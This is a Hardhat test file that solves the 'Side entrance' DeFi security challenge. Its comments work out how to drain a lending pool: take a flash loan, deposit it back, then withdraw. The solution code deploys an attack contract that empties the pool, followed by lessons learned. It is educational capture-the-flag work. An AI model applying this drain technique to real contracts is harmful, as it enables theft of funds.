const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        // Could I use a similar approach here to 3? 
        // Code an attacker smart contract, with an execute function that gives me allowance on all their ETH?
        // If I call it from a smart contract it will execute any arbitrary code I provide in an execute() function 
        // Will msg.sender be assigned to the Pool contract? Does approval on ETH work similarly to ERC20? Or is there another route? 

        // The issue is there's two separate “accounting” systems to track state
        // 1. Regular people keeping track of ETH balances using balances private mapping
        // 2. Flash loans checks just using overall contract balance

        // Ok think I got it, I could deposit some ETH, then take it out of the 'shared' pot
        // The overall balance of the contract would still be the same but I will have built up a deposited allowance of ETH
        // Then I can withdraw 'my' which would result in me having more Eth than I began with, repeat as necessary

        // Second attempt. I can flashloan out the max amount of ETH then re-deposit it straight back 
        // The overall pool contract balance will be the same but I will have 'claimed' it as a deposit under my address
        // Then in a separate tx I simply legally withdraw it

        // SOLUTION ===========================================================

        const SideEntranceAttackPoolFactory = await ethers.getContractFactory('SideEntranceAttack', attacker);
        this.attackContract = await SideEntranceAttackPoolFactory.connect(attacker).deploy(this.pool.address);

        const poolBalance = await ethers.provider.getBalance(this.pool.address);
        await this.attackContract.connect(attacker).attack(poolBalance);

        await this.attackContract.connect(attacker).withdrawFromPool();

        await this.attackContract.connect(attacker).collectFunds();


        const poolAfterBalance = await ethers.provider.getBalance(this.pool.address);
        console.log("Post-attack pool balance:", await ethers.utils.formatEther(poolAfterBalance));

        const bal = await ethers.provider.getBalance(attacker.address)
        console.log("Attacker balance:", await ethers.utils.formatEther(bal));


        // Lessons Learned ====================================================

        // Be very mindful with trying to track state using variables, you really have to make sure the system is watertight & consistent everywhere
        // Would it be an idea to use ERC20 reciept tokens here for pool deposits/withdraws instead of the in-storage mapping?

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
